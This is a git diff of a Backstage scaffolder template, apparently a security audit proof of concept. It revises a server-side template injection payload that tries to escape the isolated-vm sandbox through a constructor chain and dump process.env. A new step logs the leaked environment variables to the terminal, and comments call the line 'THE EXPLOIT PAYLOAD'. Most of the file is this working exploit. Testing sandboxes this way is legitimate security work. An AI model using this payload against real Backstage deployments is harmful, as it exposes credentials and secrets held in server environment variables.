@@ -2,19 +2,32 @@ apiVersion: scaffolder.backstage.io/v1beta3
 kind: Template
 metadata:
   name: ssti-sandbox-escape-test
+  title: Security Audit: Sandbox Escape
+  description: Testing if the isolated-vm sandbox can be bypassed to leak environment variables.
 spec:
+  type: service
+  owner: security-audit
+  
   parameters:
-    - title: Security Test
+    - title: Audit Details
       properties:
         name:
           type: string
-          default: "tester"
+          title: Audit Name
+          default: "Sandbox_Test_01"
+
   steps:
     - id: fetch
       action: fetch:template
       input:
-        url: https://github.com/ceeditnetwork/backstage-audit/blob/main/skeleton/poc.txt
+        url: ./skeleton
         values:
-          # This is the 'range.constructor' payload to break out of isolated-vm
-          # It tries to return the environment variables of your Windows machine.
-          leak: "{{ range.constructor('return process.env')() | dump }}"
+          # THIS IS THE EXPLOIT PAYLOAD
+          # It uses the constructor of a Range to access the 'process' object.
+          leak: "{{ [].constructor.constructor('return process.env')() | dump }}"
+
+    - id: log-result
+      action: debug:log
+      input:
+        # This will print the result directly to your PowerShell terminal
+        message: "Audit Result: {{ values.leak }}"
